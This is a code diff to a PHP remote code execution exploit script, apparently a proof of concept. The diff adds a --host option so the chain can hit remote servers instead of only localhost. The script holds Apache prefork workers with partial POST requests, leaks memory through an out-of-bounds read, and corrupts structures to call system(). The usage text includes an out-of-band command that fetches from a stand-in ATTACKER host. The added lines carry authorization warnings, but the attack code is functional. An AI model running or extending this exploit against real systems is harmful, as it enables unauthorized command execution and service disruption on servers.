@@ -12,9 +12,16 @@ remote target use an out-of-band command, e.g.
   --cmd 'php -r "file_get_contents(\\"http://ATTACKER/ok\\");"'
 
 usage:
-  python3 exploit.py --port 18110 --restart p2s-pure-18110
+  python3 phppoc2.py --port 18110 --restart p2s-pure-18110
+  python3 phppoc2.py --host 10.0.0.5 --port 18110   (lab target on another box)
 
 `pure/pwn_pure.py` is kept as a compatibility alias for this entry point.
+
+The default target is 127.0.0.1.  --host exists for lab setups where the
+Docker target runs on another machine; only point it at systems you are
+explicitly authorized to test.  Note that --proof is read on the machine
+running the exploit, so a remote --host needs a shared /out volume or an
+out-of-band --cmd.
 
 For the stock official prefork config (MaxRequestWorkers=150), the exploit
 holds `--workers - 1` partial requests open so the four chain requests are
@@ -58,9 +65,10 @@ PROFILES = {
 }
 
 
-def send_chunked(port: int, path: str, body_file: str, timeout: float,
+def send_chunked(host: str, port: int, path: str, body_file: str, timeout: float,
                  save: str = "") -> bytes:
     cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"),
+           "--host", host,
            "--port", str(port), "--body-file", body_file,
            "--path", path, "--timeout", str(timeout)]
     if save:
@@ -69,13 +77,13 @@ def send_chunked(port: int, path: str, body_file: str, timeout: float,
     return open(save, "rb").read() if save else b""
 
 
-def send_plain(port: int, path: str, body: bytes, timeout: float = 120.0) -> bytes:
-    req = ("POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n"
+def send_plain(host: str, port: int, path: str, body: bytes, timeout: float = 120.0) -> bytes:
+    req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n" %
-           (path, port, "C" * 10, len(body))).encode()
+           (path, host, port, "C" * 10, len(body))).encode()
     out = bytearray()
-    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
+    s = socket.create_connection((host, port), timeout=timeout)
     s.settimeout(timeout)
     try:
         s.sendall(req + body)
@@ -140,7 +148,7 @@ def parse_leak(resp: bytes, profile=None):
     }
 
 
-def hold_workers(port: int, workers: int):
+def hold_workers(host: str, port: int, workers: int):
     """Occupy all but one prefork child with incomplete POST bodies.
 
     The official image ships MaxRequestWorkers=150.  Holding 149 children
@@ -153,8 +161,8 @@ def hold_workers(port: int, workers: int):
     n = workers - 1
     for i in range(n):
         try:
-            s = socket.create_connection(("127.0.0.1", port), timeout=5)
-            s.sendall(b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
+            s = socket.create_connection((host, port), timeout=5)
+            s.sendall(("POST /index.php HTTP/1.1\r\nHost: %s\r\n" % host).encode() +
                       b"Content-Type: application/x-www-form-urlencoded\r\n"
                       b"Content-Length: 1048576\r\n\r\nx")
             holders.append(s)
@@ -170,6 +178,9 @@ def hold_workers(port: int, workers: int):
 
 def main() -> int:
     ap = argparse.ArgumentParser()
+    ap.add_argument("--host", default="127.0.0.1",
+                    help="target host (default: 127.0.0.1; lab use only -- "
+                         "only point at systems you are authorized to test)")
     ap.add_argument("--port", type=int, default=18110)
     ap.add_argument("--arch", choices=("auto",) + tuple(PROFILES),
                     default="auto",
@@ -187,6 +198,9 @@ def main() -> int:
     args = ap.parse_args()
     profile = None if args.arch == "auto" else PROFILES[args.arch]
 
+    if args.host not in ("127.0.0.1", "localhost", "::1"):
+        print("[!] target host is %s -- authorized lab/testing use only" % args.host)
+
     os.makedirs(args.outdir, exist_ok=True)
     if os.path.exists(args.proof):
         try:
@@ -199,7 +213,7 @@ def main() -> int:
                        check=True, stdout=subprocess.DEVNULL)
         time.sleep(1.2)
 
-    holders = hold_workers(args.port, args.workers)
+    holders = hold_workers(args.host, args.port, args.workers)
     try:
         return run_chain(args, holders, profile)
     finally:
@@ -214,7 +228,7 @@ def run_chain(args, holders, profile) -> int:
     for attempt in range(1, args.retries + 1):
         tmp = tempfile.mkdtemp(prefix="p2s-pure-")
         try:
-            s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
+            s = socket.create_connection((args.host, args.port), timeout=5)
             s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
             s.recv(1024)
             s.close()
@@ -226,7 +240,7 @@ def run_chain(args, holders, profile) -> int:
         subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                         "--out", a1, "--big", "78"], check=True,
                        stdout=subprocess.DEVNULL)
-        send_chunked(args.port, "/index.php" + Q, a1, 180)
+        send_chunked(args.host, args.port, "/index.php" + Q, a1, 180)
         time.sleep(0.2)
 
         print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
@@ -237,7 +251,7 @@ def run_chain(args, holders, profile) -> int:
                        stdout=subprocess.DEVNULL)
         leak_file = os.path.join(tmp, "leak.resp")
         try:
-            resp = send_chunked(args.port, "/index.php", b1, args.timeout, leak_file)
+            resp = send_chunked(args.host, args.port, "/index.php", b1, args.timeout, leak_file)
             info = parse_leak(resp, profile)
         except Exception as exc:
             print("      leak failed: %r" % (exc,))
@@ -262,6 +276,7 @@ def run_chain(args, holders, profile) -> int:
             print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x" % (
                 attempt, cand, S, zif))
             subprocess.run([sys.executable, os.path.join(PURE, "cheap_oom_a.py"),
+                            "--host", args.host,
                             "--port", str(args.port), "--parts", "880",
                             "--depth", "64", "--fillers", "115"], check=True,
                            stdout=subprocess.DEVNULL)
@@ -271,6 +286,7 @@ def run_chain(args, holders, profile) -> int:
                             hex(S), hex(zif), args.cmd, ht], check=True,
                            stdout=subprocess.DEVNULL)
             subprocess.run([sys.executable, os.path.join(PURE, "fake_ref_b.py"),
+                            "--host", args.host,
                             "--port", str(args.port), "--vl", "384",
                             "--n1", "500", "--n2", "495", "--rc", "1",
                             "--ht-addr", hex(S), "--ht-file", ht], check=True,
